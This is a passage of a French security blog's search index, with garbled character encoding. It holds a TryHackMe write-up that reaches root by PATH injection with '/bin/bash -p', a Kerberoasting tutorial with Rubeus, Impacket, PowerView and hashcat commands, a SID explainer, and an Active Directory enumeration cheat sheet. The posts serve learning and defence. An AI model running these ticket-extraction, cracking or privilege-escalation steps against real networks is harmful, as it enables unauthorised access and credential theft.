MITRE ATT\u0026amp;CK https://attack.mitre.org/\n","permalink":"https://nyobemichel.me/posts/pr%C3%A9requis-pour-un-test-de-p%C3%A9n%C3%A9tration/","summary":"Une vue d\u0026rsquo;ensemble structurÃ©e des prÃ©requis et mÃ©thodologies Ã  maÃ®triser avant de rÃ©aliser un test dâ€™intrusion.","title":"PrÃ©requis pour un test de pÃ©nÃ©tration part1"},{"content":"Enumeration Nmap Nous commenÃ§ons par exÃ©cuter une analyse nmap sur la cible :\nLe scan nous montre que le port 22 et 80 sont ouverts.\nWebserver Je tombe sur un site web anodin :\nAprÃ¨s Ã©numÃ©ration des rÃ©pertoires, je dÃ©couvre /spip :\nRÃ©fÃ©rence Metasploit utilisÃ©e :\nhttps://github.com/rapid7/metasploit-framework/pull/17711/files\nAprÃ¨s plusieurs heures, jâ€™ai essayÃ© le framework Metasploit :\nPATH Injection AppArmor est un outil qui permet de restreindre un programme avec des rÃ¨gles. Vous pouvez accÃ©der Ã  ces informations par une simple recherche sur Google.\nJâ€™ai eu cette indication dans la salle, je suis donc allÃ© examiner les fichiers AppArmor pour mieux comprendre les rÃ¨gles :\nJ\u0026rsquo;ajoute le dossier /var/tmp, sur lequel jâ€™ai les droits dâ€™Ã©criture.\nJe crÃ©e ensuite un fichier binaire appelÃ© docker et l\u0026rsquo;autorise Ã  s\u0026rsquo;exÃ©cuter. Ce fichier contient /bin/bash -p. Je souhaite donc utiliser la commande bash en mode privilÃ©giÃ©.\nSi vous faites attention, lorsque jâ€™imprime la valeur $PATH, le shell initial est ash, mais aprÃ¨s lâ€™opÃ©ration, il devient bash.\nEnsuite, je copie mon fichier docker dans /opt/run_container.sh et j\u0026rsquo;exÃ©cute le binaire /usr/sbin/run_container avec le bit SUIDâ€¦ et je suis ROOT !!!\n","permalink":"https://nyobemichel.me/posts/publisher-thm/","summary":"tryhackme","title":"Publisher - THM"},{"content":"Introduction Kerberoasting est une technique dâ€™attaque post-exploitation qui cible les environnements Active Directory, plus prÃ©cisÃ©ment les comptes de service protÃ©gÃ©s par le protocole dâ€™authentification Kerberos.\nLâ€™objectif de lâ€™attaquant est de rÃ©cupÃ©rer des tickets de service (TGS) chiffrÃ©s, puis de craquer hors ligne les hashs de mots de passe des comptes de service associÃ©s Ã  des Service Principal Names (SPN). Une fois le mot de passe rÃ©cupÃ©rÃ©, cela peut mener Ã  une Ã©lÃ©vation de privilÃ¨ges ou Ã  une lateralisation dans le rÃ©seau.\nâš™ï¸ Fonctionnement du protocole Kerberos (rappel rapide) Lorsquâ€™un utilisateur demande lâ€™accÃ¨s Ã  un service, il envoie un TGT (Ticket Granting Ticket) valide et le nom du service (via le sname) au KDC (Key Distribution Center). Si le ticket est valide, le KDC renvoie un TGS, chiffrÃ© avec le hash du mot de passe du compte de service ciblÃ©.\nCâ€™est cette Ã©tape que lâ€™attaquant va dÃ©tourner pour capturer ce TGS et tenter de retrouver le mot de passe par brute force ou dictionnaire.\nğŸ§  Ã‰tapes de lâ€™attaque Kerberoasting Voici le workflow typique dâ€™une attaque Kerberoasting :\n1. AccÃ¨s initial Lâ€™attaquant compromet un compte dâ€™utilisateur standard dans le domaine Active Directory.\n2. Reconnaissance Il utilise des outils pour Ã©numÃ©rer les SPN prÃ©sents dans le domaine (comptes de service).\n3. RequÃªte TGS Il envoie des requÃªtes au contrÃ´leur de domaine pour obtenir les tickets TGS associÃ©s Ã  ces SPN.\n4. Extraction de tickets Il extrait les TGS localement (le systÃ¨me les stocke en mÃ©moire), Ã  lâ€™aide dâ€™outils comme Rubeus ou Mimikatz.\n5. Crackage hors ligne Le ticket est crackÃ© hors ligne avec Hashcat ou John the Ripper afin de rÃ©vÃ©ler le mot de passe du compte de service.\nğŸ”§ Outils utiles Voici une liste dâ€™outils populaires pour mener une attaque Kerberoasting :\nRubeus (C#) Mimikatz Impacket - GetUserSPNs.py PowerView (PowerShell) Empire / Invoke-Kerberoast.ps1 Hashcat ou John pour le crackage hors ligne ğŸ’¥ ExÃ©cution de lâ€™attaque - Cas pratiques ğŸ¯ Kerberoasting avec Rubeus Rubeus.exe kerberoast ğŸ’£ Cracker le hash avec Hashcat hashcat -m 13100 -a 0 hash.txt wordlist.txt ğŸ Kerberoasting avec Impacket (GetUserSPNs.py) Lister les comptes SPN :\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend Extraire le TGS chiffrÃ© :\nsudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.3.141 -request âš¡ Kerberoasting avec PowerView Importer PowerView :\nImport-Module .\\PowerView.ps1 Lister les utilisateurs avec SPN :\nGet-DomainUser * -SPN | select samaccountname Extraire un TGS au format Hashcat :\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat Exporter tous les tickets vers un fichier CSV:\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tickets.csv -NoTypeInformation ğŸ§­ Contextes dâ€™exÃ©cution possibles Une attaque Kerberoasting peut Ãªtre lancÃ©e Ã  partir de diffÃ©rents environnements :\nğŸ’» Windows joint au domaine, avec un shell utilisateur ou SYSTEM ğŸ§ Linux joint ou non au domaine, avec keytab ou identifiants ğŸ” Shell distant avec runas /netonly sur Windows ğŸ§ª Via un accÃ¨s VPN ou une session RDP, avec des outils de pentest ğŸ›¡ï¸ DÃ©tection \u0026amp; dÃ©fense Pour se dÃ©fendre contre Kerberoasting, voici quelques bonnes pratiques :\nUtiliser des mots de passe robustes et complexes pour les comptes de service Ã‰viter les comptes de service Ã  privilÃ¨ges Ã©levÃ©s (comme Domain Admin) ImplÃ©menter Managed Service Accounts (MSA/gMSA) Surveiller les requÃªtes TGS en masse DÃ©ployer des solutions de dÃ©tection comportementale (EDR, SIEM, etc.) Restreindre les permissions des utilisateurs standards ğŸ“š RÃ©fÃ©rences utiles Rubeus GitHub Impacket Tools PowerView Kerberoasting Technique (MITRE ATT\u0026amp;CK) ","permalink":"https://nyobemichel.me/posts/kerberoasting/","summary":"Une attaque redoutable post-exploitation qui cible les services Kerberos dans les environnements Active Directory. DÃ©cryptons ensemble la mÃ©thode, les outils et les moyens de dÃ©fense.","title":"Kerberoasting : Attaque d'Active Directory via Kerberos"},{"content":"Comprendre les Identificateurs de SÃ©curitÃ© (SID) dans Active Directory Un identificateur de sÃ©curitÃ© (SID) est utilisÃ© pour identifier de maniÃ¨re unique un principal de sÃ©curitÃ© ou un groupe de sÃ©curitÃ© dans un environnement Windows. Ces identifiants jouent un rÃ´le fondamental dans la gestion des autorisations et l\u0026rsquo;authentification au sein dâ€™un domaine Active Directory.\n1. Quâ€™est-ce quâ€™un principal de sÃ©curitÃ© ? Un principal de sÃ©curitÃ© est toute entitÃ© pouvant Ãªtre authentifiÃ©e par le systÃ¨me dâ€™exploitation. Il peut sâ€™agir :\ndâ€™un compte dâ€™utilisateur,\ndâ€™un compte dâ€™ordinateur,\nou dâ€™un thread ou processus exÃ©cutÃ© dans le contexte de sÃ©curitÃ© dâ€™un compte existant.\nChaque fois quâ€™un utilisateur se connecte, le systÃ¨me gÃ©nÃ¨re un jeton dâ€™accÃ¨s contenant :\nle SID de lâ€™utilisateur,\nles droits de lâ€™utilisateur,\net les SID des groupes auxquels lâ€™utilisateur appartient.\nCe jeton dâ€™accÃ¨s dÃ©finit le contexte de sÃ©curitÃ© utilisÃ© par lâ€™utilisateur pour interagir avec le systÃ¨me.\n2. Architecture dâ€™un SID Un SID est une structure de donnÃ©es binaire contenant un nombre variable de valeurs. Les premiÃ¨res valeurs dÃ©crivent la structure du SID, tandis que les suivantes identifient lâ€™autoritÃ©, le domaine et lâ€™objet.\nUne fois converti au format lisible, un SID suit gÃ©nÃ©ralement cette notation standard :\nCopierModifier\nS-R-X-Y1-Y2-Yn-1-Yn\nExemple : Le SID du groupe intÃ©grÃ© Administrateurs est reprÃ©sentÃ© comme suit :\nCopierModifier\nS-1-5-32-544\nDÃ©composons ce SID :\nS : identifie quâ€™il sâ€™agit dâ€™un SID.\n1 : niveau de rÃ©vision.\n5 : autoritÃ© dâ€™identification (AutoritÃ© NT).\n32 : identifiant du domaine (Builtin).\n544 : identifiant relatif (RID) pour le groupe Â« Administrateurs Â».\n3. SID connus Certains SID sont prÃ©-dÃ©finis et restent constants, quel que soit lâ€™environnement ou le systÃ¨me. Ces SID connus sont gÃ©nÃ©rÃ©s automatiquement lors de lâ€™installation du systÃ¨me dâ€™exploitation ou de la crÃ©ation du domaine. Ils sont utilisÃ©s pour identifier :\ndes groupes gÃ©nÃ©riques (Administrateurs, Utilisateurs, etc.),\nou des comptes systÃ¨me standards.\nPar exemple :\nS-1-5-18 : reprÃ©sente le compte SYSTEM.\nS-1-5-19 : correspond au Service local.\nS-1-5-32-544 : dÃ©signe le groupe Administrateurs.\nRÃ©fÃ©rences Comprendre les identificateurs de sÃ©curitÃ© - Microsoft Docs ","permalink":"https://nyobemichel.me/posts/sid--identificateurs-de-s%C3%A9curit%C3%A9-/","summary":"Un identificateur de sÃ©curitÃ© (SID) est essentiel dans la gestion des accÃ¨s et de la sÃ©curitÃ© dans les systÃ¨mes Windows. DÃ©couvrez comment il fonctionne, son rÃ´le dans l\u0026rsquo;authentification et sa structure binaire.","title":"SID ( Identificateurs de sÃ©curitÃ© )"},{"content":"ğŸ“ 1. Domaine et ForÃªts ğŸ” Obtenir le domaine actuel Get-Domain # PowerView Get-ADDomain # Module ActiveDirectory ğŸŒ Interroger un autre domaine Get-Domain -Domain example.local Get-ADDomain -Identity example.local ğŸ†” RÃ©cupÃ©rer le SID du domaine Get-DomainSID (Get-ADDomain).DomainSID ğŸ–¥ï¸ RÃ©cupÃ©rer les contrÃ´leurs de domaine Get-DomainController Get-ADDomainController ğŸ¤ Obtenir les relations dâ€™approbation (trusts) Get-DomainTrust Get-ADTrust ğŸŒ² Informations sur la forÃªt Get-Forest Get-ADForest ğŸ“œ Lister tous les domaines dâ€™une forÃªt Get-ForestDomain (Get-ADForest).Domains ğŸ—ºï¸ Cartographier les fiducies d\u0026rsquo;une forÃªt Get-ForestTrust Get-ADTrust -Filter \u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39; ğŸ‘¤ 2. Utilisateurs ğŸ‘¥ Liste des utilisateurs Get-DomainUser Get-ADUser -Filter * -Properties * ğŸ” DÃ©tails dâ€™un utilisateur spÃ©cifique Get-DomainUser -Identity user1 -Properties * Get-ADUser -Identity user1 -Properties * ğŸ”„ PropriÃ©tÃ©s utiles Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name ğŸ‘‘ Membres du groupe Â« Enterprise Admins Â» Get-DomainGroupMember -Identity \u0026#34;Enterprise Admins\u0026#34; -Recurse ğŸ–¥ï¸ Groupes locaux d\u0026rsquo;une machine (privilÃ¨ges requis) Get-NetLocalGroup -ComputerName dcorp-dc Get-NetLocalGroup -ComputerName dcorp-dc -GroupName Administrators ğŸ” Recherche dâ€™accÃ¨s administrateur local Find-LocalAdminAccess -Verbose ğŸ” Comptes dont le mot de passe nâ€™expire jamais Get-ADUser -Filter {PasswordNeverExpires -eq $true} ğŸ­ Comptes avec dÃ©lÃ©gation Kerberos activÃ©e Get-ADUser -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} ğŸ§¾ Droits de l\u0026rsquo;utilisateur actuel whoami /priv ğŸ‘ª 3. Groupes ğŸ“‹ Lister les groupes Get-DomainGroup Get-ADGroup -Filter * -Properties * ğŸ” Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo; Get-DomainGroup *admin* Get-ADGroup -Filter \u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39; ğŸ‘‘ Membres Â« Domain Admins Â» Get-DomainGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Recurse ğŸ–¥ï¸ 4. Machines \u0026amp; Serveurs ğŸ“œ Liste des ordinateurs Get-DomainComputer Get-ADComputer -Filter * -Properties * ğŸ” Recherche spÃ©cifique (ex. Server 2022) Get-DomainComputer -OperatingSystem \u0026#34;*Server 2022*\u0026#34; ğŸ“¡ Test de connectivitÃ© Get-ADComputer -Filter * -Properties DNSHostName | % { Test-Connection -Count 1 -ComputerName $_.DNSHostName } ğŸ‘ï¸ Localisation des sessions dâ€™un utilisateur Find-DomainUserLocation -UserGroupIdentity \u0026#34;RDPUsers\u0026#34; ğŸ” 5. ACL et Permissions ğŸ” Obtenir les ACL dâ€™un objet Get-DomainObjectAcl -SamAccountName user1 -ResolveGUIDs ğŸ§  Rechercher des ACE intÃ©ressants Find-InterestingDomainAcl -ResolveGUIDs ğŸ“‚ ACL sur un chemin spÃ©cifique Get-PathAcl -Path \u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34; ğŸ“‚ 6. Autres Techniques ğŸ“‚ DÃ©couverte de serveurs de fichiers Get-NetFileServer ğŸ“š Ressources utiles PowerView Documentation (PowerSploit) Cmdlets Active Directory Microsoft ","permalink":"https://nyobemichel.me/posts/enumeration-active-directory/","summary":"\u003ch2 id=\"-1-domaine-et-forÃªts\"\u003eğŸ“ 1. Domaine et ForÃªts\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-le-domaine-actuel\"\u003eğŸ” Obtenir le domaine actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e                \u003cspan class=\"c\"\u003e# PowerView\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e              \u003cspan class=\"c\"\u003e# Module ActiveDirectory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-interroger-un-autre-domaine\"\u003eğŸŒ Interroger un autre domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rÃ©cupÃ©rer-le-sid-du-domaine\"\u003eğŸ†” RÃ©cupÃ©rer le SID du domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rÃ©cupÃ©rer-les-contrÃ´leurs-de-domaine\"\u003eğŸ–¥ï¸ RÃ©cupÃ©rer les contrÃ´leurs de domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-obtenir-les-relations-dapprobation-trusts\"\u003eğŸ¤ Obtenir les relations dâ€™approbation (trusts)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-informations-sur-la-forÃªt\"\u003eğŸŒ² Informations sur la forÃªt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Forest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-lister-tous-les-domaines-dune-forÃªt\"\u003eğŸ“œ Lister tous les domaines dâ€™une forÃªt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestDomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomains\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-cartographier-les-fiducies-dune-forÃªt\"\u003eğŸ—ºï¸ Cartographier les fiducies d\u0026rsquo;une forÃªt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-2-utilisateurs\"\u003eğŸ‘¤ 2. Utilisateurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-utilisateurs\"\u003eğŸ‘¥ Liste des utilisateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-dÃ©tails-dun-utilisateur-spÃ©cifique\"\u003eğŸ” DÃ©tails dâ€™un utilisateur spÃ©cifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-propriÃ©tÃ©s-utiles\"\u003eğŸ”„ PropriÃ©tÃ©s utiles\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003e-First\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Member\u003c/span\u003e \u003cspan class=\"n\"\u003e-MemberType\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eProperty\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003eName\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres-du-groupe--enterprise-admins-\"\u003eğŸ‘‘ Membres du groupe Â« Enterprise Admins Â»\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Enterprise Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-groupes-locaux-dune-machine-privilÃ¨ges-requis\"\u003eğŸ–¥ï¸ Groupes locaux d\u0026rsquo;une machine (privilÃ¨ges requis)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e \u003cspan class=\"n\"\u003e-GroupName\u003c/span\u003e \u003cspan class=\"n\"\u003eAdministrators\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-daccÃ¨s-administrateur-local\"\u003eğŸ” Recherche dâ€™accÃ¨s administrateur local\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-LocalAdminAccess\u003c/span\u003e \u003cspan class=\"n\"\u003e-Verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-dont-le-mot-de-passe-nexpire-jamais\"\u003eğŸ” Comptes dont le mot de passe nâ€™expire jamais\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ePasswordNeverExpires\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-avec-dÃ©lÃ©gation-kerberos-activÃ©e\"\u003eğŸ­ Comptes avec dÃ©lÃ©gation Kerberos activÃ©e\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eTrustedForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e \u003cspan class=\"o\"\u003e-or\u003c/span\u003e \u003cspan class=\"n\"\u003eTrustedToAuthForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-droits-de-lutilisateur-actuel\"\u003eğŸ§¾ Droits de l\u0026rsquo;utilisateur actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewhoami\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003epriv\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-3-groupes\"\u003eğŸ‘ª 3. Groupes\u003c/h2\u003e\n\u003ch3 